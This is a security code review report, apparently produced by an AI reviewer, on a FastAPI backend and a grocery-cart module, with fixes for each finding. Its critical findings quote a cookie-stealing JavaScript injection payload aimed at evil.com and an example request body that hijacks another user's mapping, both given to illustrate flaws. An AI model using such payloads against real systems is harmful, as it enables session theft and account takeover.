---
phase: 48-session-warmup-optimization
reviewed: 2026-04-11T12:00:00Z
depth: standard
files_reviewed: 2
files_reviewed_list:
  - backend/main.py
  - cart/vkusvill_api.py
findings:
  critical: 3
  warning: 7
  info: 5
  total: 15
status: issues_found
---

# Phase 48: Code Review Report

**Reviewed:** 2026-04-11T12:00:00Z
**Depth:** standard
**Files Reviewed:** 2
**Status:** issues_found

## Summary

Reviewed `backend/main.py` (4598 lines) and `cart/vkusvill_api.py` (613 lines). The main backend file is severely oversized (9x the 500-line project limit from CLAUDE.md) and contains the entire application in a single module. Key concerns: (1) a JavaScript injection vulnerability in the captcha endpoint, (2) an unauthenticated endpoint that allows user-to-user mapping hijacking, (3) IDOR weakness in the fallback auth path, and (4) several missing error-handling patterns.

## Critical Issues

### CR-01: JavaScript Injection via Captcha Answer

**File:** `backend/main.py:2276-2297`
**Issue:** The captcha answer from `req.captcha_answer` is interpolated directly into a JavaScript f-string passed to `tab.evaluate()`. A malicious captcha answer like `'; document.location='https://evil.com/?c='+document.cookie; '` would break out of the string literal and execute arbitrary JavaScript in the browser context, potentially leaking session cookies.
**Fix:**
```python
# Use json.dumps to safely escape the answer for JS string embedding
import json as _json_escape
safe_answer = _json_escape.dumps(answer)  # Produces '"escaped_value"'
typed_ok = await safe_evaluate(tab, f"""
    (function() {{
        var inp = document.querySelector('input[placeholder*="letters"]...');
        if (inp) {{
            inp.focus();
            inp.value = '';
            var nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
            nativeInputValueSetter.call(inp, {safe_answer});
            ...
        }}
    }})()
""")
```

### CR-02: Same JS Injection in SMS Code Verification

**File:** `backend/main.py:2733-2743`
**Issue:** The SMS verification code is interpolated into a JavaScript f-string via `'{code}'`. While the code is validated as digits-only (line 2590), the pattern is dangerous and fragile -- if the validation check is ever loosened or bypassed, injection becomes possible. Additionally, the same unsafe pattern exists at line 2276 for captcha answers which are NOT digits-only.
**Fix:**
```python
import json as _json_escape
safe_code = _json_escape.dumps(code)
await safe_evaluate(tab, f"""
    (function() {{
        var inp = document.querySelector('input[name="SMS"]');
        if (!inp) return;
        var ns = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
        ns.call(inp, {safe_code});
        ...
    }})()
""")
```

### CR-03: Unauthenticated Transfer-Mapping Endpoint Allows User Hijacking

**File:** `backend/main.py:3250-3258`
**Issue:** The `/api/auth/transfer-mapping` endpoint has NO authentication or authorization checks. Any client can POST `{"from_user_id": "victim_id", "to_user_id": "attacker_id"}` to copy the victim's phone mapping to themselves, gaining access to the victim's VkusVill cart session. This is a direct IDOR/authorization bypass.
**Fix:**
```python
@app.post("/api/auth/transfer-mapping")
def auth_transfer_mapping(req: TransferMappingRequest, request: Request):
    # Require the caller to prove they own the from_user_id
    _validate_user_header(request, req.from_user_id)
    phone = _get_phone_for_user(req.from_user_id)
    if phone:
        _save_user_phone_mapping(req.to_user_id, phone)
        return {"success": True, "message": "Mapping transferred"}
    return {"success": False, "message": "No mapping found for source user"}
```

## Warnings

### WR-01: IDOR Weakness in Fallback Auth Path (Header-Only Check)

**File:** `backend/main.py:388-391`
**Issue:** When no Telegram `initData` is provided, `_validate_user_header` falls back to checking the `X-Telegram-User-Id` header. This header is trivially spoofable by any HTTP client. An attacker can access any user's favorites, cart, or auth status by setting `X-Telegram-User-Id: <victim_id>`. This is documented as "Path 2 (Guest/Browser)" but provides no real security for authenticated user data.
**Fix:** Consider requiring `initData` for all sensitive endpoints (cart operations, favorites), or add a session token mechanism for guest users. At minimum, document the risk and ensure sensitive operations (cart/add, logout) require the Telegram auth path.

### WR-02: Duplicate asyncio Event Loop Policy Setting

**File:** `backend/main.py:9-11` and `backend/main.py:48-50`
**Issue:** `WindowsProactorEventLoopPolicy` is set twice at module level. The first occurrence (lines 9-11) and second occurrence (lines 48-50) are identical. While not a bug, the duplication with different imports (`_sys` vs `sys`, `_asyncio` vs `_asyncio`) is confusing and suggests copy-paste drift.
**Fix:** Remove the duplicate block at lines 48-50 since lines 9-11 already handle this.

### WR-03: PIN Verification Uses Non-Constant-Time Comparison

**File:** `backend/main.py:3190`
**Issue:** PIN hash comparison uses `==` operator: `salted_hash == pin_data["pin_hash"] or unsalted_hash == pin_data["pin_hash"]`. String equality with `==` is not constant-time and is vulnerable to timing attacks. While this is a 4-digit PIN (limited attack surface), the project already uses `hmac.compare_digest` elsewhere (line 317, 356).
**Fix:**
```python
pin_matches = (hmac.compare_digest(salted_hash, pin_data["pin_hash"]) or
               hmac.compare_digest(unsalted_hash, pin_data["pin_hash"]))
```

### WR-04: Indentation Error in Captcha Solving Loop

**File:** `backend/main.py:2036-2122`
**Issue:** The second captcha solving loop at line 2036-2122 has inconsistent indentation. The `for _cap2_attempt in range(3):` body uses incorrect indent levels mixing spaces, and lines 2111-2117 appear to be indented inside an `if b2:` block when they should be at the `try` level. This may cause `IndentationError` at runtime or incorrect control flow. The `except` at line 2118 matches the `try` at 2038, but the inner `if still_captcha` block (2111-2117) has extra indentation suggesting it was meant to be inside `if b2:` which changes the logic.
**Fix:** Reformat the entire captcha-retry block (lines 2036-2122) with consistent 4-space indentation. Ensure the `if still_captcha` check runs after the submit attempt regardless of which path was taken.

### WR-05: GitHub Webhook Accepts Unsigned Requests When Secret Not Set

**File:** `backend/main.py:4543-4544`
**Issue:** When `GITHUB_WEBHOOK_SECRET` is empty (default), the signature verification is skipped entirely, allowing any HTTP client to trigger `git pull` and potentially `systemctl restart` on the server. This is a privilege escalation path -- an attacker can craft a payload claiming backend files changed, causing a restart with potentially malicious code if they have push access.
**Fix:**
```python
webhook_secret = os.environ.get("GITHUB_WEBHOOK_SECRET", "")
if not webhook_secret:
    return JSONResponse(status_code=403, content={"error": "webhook secret not configured"})
```

### WR-06: Race Condition in _persist_session_metadata (Read-Modify-Write Without Lock)

**File:** `cart/vkusvill_api.py:221-236`
**Issue:** `_persist_session_metadata` reads the cookies file, modifies it, and writes it back without any file locking. If two VkusVillCart instances operate on the same cookies file concurrently (e.g., two cart operations for the same user), data loss can occur. The backend's `_phone_map_lock` pattern is not applied here.
**Fix:** Use a file lock (e.g., `fcntl.flock` on Linux or a threading lock) around the read-modify-write operation, or use atomic write (write to temp file, then rename).

### WR-07: Bare except Clauses Throughout main.py

**File:** `backend/main.py:1619,1650,1837,2399,2754` (and many more)
**Issue:** There are numerous bare `except:` clauses (without specifying exception type) used throughout the login flow, typically around `tab.save_screenshot()` calls. While individually low risk, bare excepts can mask unexpected errors (e.g., `KeyboardInterrupt`, `SystemExit`, `MemoryError`) making debugging extremely difficult.
**Fix:** Replace bare `except:` with `except Exception:` at minimum, or better yet `except (OSError, asyncio.TimeoutError):` for screenshot operations.

## Info

### IN-01: File Exceeds 500-Line Project Limit (9x Over)

**File:** `backend/main.py` (4598 lines)
**Issue:** CLAUDE.md specifies "Keep files under 500 lines." This file is 4598 lines -- over 9 times the limit. It contains FastAPI routes, auth flows, captcha solving, proxy management, scraper orchestration, cart operations, history endpoints, admin panel, and GitHub webhooks all in one module.
**Fix:** Split into modules: `backend/routes/auth.py`, `backend/routes/cart.py`, `backend/routes/admin.py`, `backend/routes/products.py`, `backend/services/captcha.py`, `backend/services/scraper.py`.

### IN-02: Duplicate _coerce_numeric Functions

**File:** `cart/vkusvill_api.py:36-43` and `backend/main.py:3547-3554`
**Issue:** `_coerce_numeric` in `vkusvill_api.py` and `_coerce_cart_numeric` in `main.py` are identical functions. This is dead code duplication.
**Fix:** Import and reuse `_coerce_numeric` from `cart.vkusvill_api` in `main.py`.

### IN-03: Redundant sys Import

**File:** `backend/main.py:131`
**Issue:** `import sys as _sys` is redundant -- `sys` is already imported at line 43. The `_sys` alias is used only to check `BASE_PROJECT_DIR not in _sys.path` but `sys` is available.
**Fix:** Replace `_sys` with `sys` on lines 131-133 and remove the redundant import.

### IN-04: Redundant Null Check After Guaranteed Return

**File:** `cart/vkusvill_api.py:120-124`
**Issue:** Lines 120-121 check `if not self.sessid or not self.user_id` and log a warning. Then lines 123-124 check the exact same condition and log another warning. The duplicate check adds no value.
**Fix:** Remove the duplicate check at lines 123-124, keeping only the first warning.

### IN-05: Debug Screenshots Not Cleaned in Production

**File:** `backend/main.py:1618-1619,1648-1650,1664-1665` (many locations)
**Issue:** Numerous `tab.save_screenshot()` calls save PNG files to the data directory during login flows. While `_cleanup_debug_screenshots` runs periodically (1-hour TTL), these screenshots may contain sensitive user data (phone numbers visible in input fields, captcha content) and are stored on disk.
**Fix:** Consider making debug screenshots conditional on a `DEBUG` environment variable, or ensure the cleanup runs more aggressively in production.

---

_Reviewed: 2026-04-11T12:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
